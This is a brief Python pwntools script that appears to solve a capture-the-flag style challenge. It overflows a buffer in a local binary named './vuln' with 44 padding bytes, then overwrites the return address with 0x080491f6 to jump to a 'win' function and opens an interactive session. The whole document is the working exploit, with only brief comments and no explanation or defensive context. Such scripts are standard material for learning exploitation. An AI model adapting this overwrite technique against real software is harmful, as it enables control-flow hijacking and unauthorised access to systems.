from pwn import *

# Address of the win function
win_addr = p32(0x080491f6)

# Create the payload: 44 bytes of padding followed by the address of win()
payload = b"A" * 44 + win_addr

# Start the process and send the payload
p = process("./vuln")
p.sendline(payload)
p.interactive()